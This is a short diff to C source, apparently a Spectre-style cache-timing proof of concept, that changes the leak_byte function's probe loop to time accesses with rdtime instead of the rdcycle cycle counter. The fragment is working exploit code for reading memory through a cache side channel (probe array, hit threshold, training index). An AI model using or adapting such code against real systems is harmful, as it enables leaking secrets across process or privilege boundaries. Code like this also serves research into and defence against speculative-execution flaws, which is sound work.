@@ -92,9 +92,14 @@ int leak_byte(int offset, char* leak) {
     int idx;
     for (int i = 0; i < 256; i++) {
       idx = (i * 167 + 13) & 255;
-      before = rdcycle(&junk2);
+      
+      // before = rdcycle(&junk2); high resolution timer
+      before = rdtime(&junk2);
       junk += probe_array[idx * PAGE_SIZE];
-      after = rdcycle(&junk2);
+      
+      // after = rdcycle(&junk2);
+      after = rdtime(&junk2);
+
       elapsed[idx] = after - before;
       if (elapsed[idx] < CACHE_HIT_THRESHOLD && idx != training_x) {
         hits[idx]++;
